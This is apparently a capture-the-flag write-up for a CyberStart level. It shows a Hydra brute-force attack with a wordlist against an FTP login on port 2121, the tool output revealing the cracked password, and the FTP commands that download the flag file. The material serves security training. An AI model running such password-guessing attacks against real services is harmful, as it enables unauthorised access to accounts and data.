retep@desktop:~/ctf/cyberstart/level8/12$ hydra -l secure_user -P ./words.txt services.cyberprotection.agency ftp -s 2121
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-10 15:58:13
[DATA] max 16 tasks per 1 server, overall 16 tasks, 909 login tries (l:1/p:909), ~57 tries per task
[DATA] attacking ftp://services.cyberprotection.agency:2121/
[STATUS] 267.00 tries/min, 267 tries in 00:01h, 642 to do in 00:03h, 16 active


[2121][ftp] host: services.cyberprotection.agency   login: secure_user   password: mutineers
[STATUS] 303.00 tries/min, 909 tries in 00:03h, 1 to do in 00:01h, 6 active


Then login passively

```
ftp -p services.cyberprotection.agency 2121
secure_user
mutineers
ls -l
get FLAG.txt
exit
```
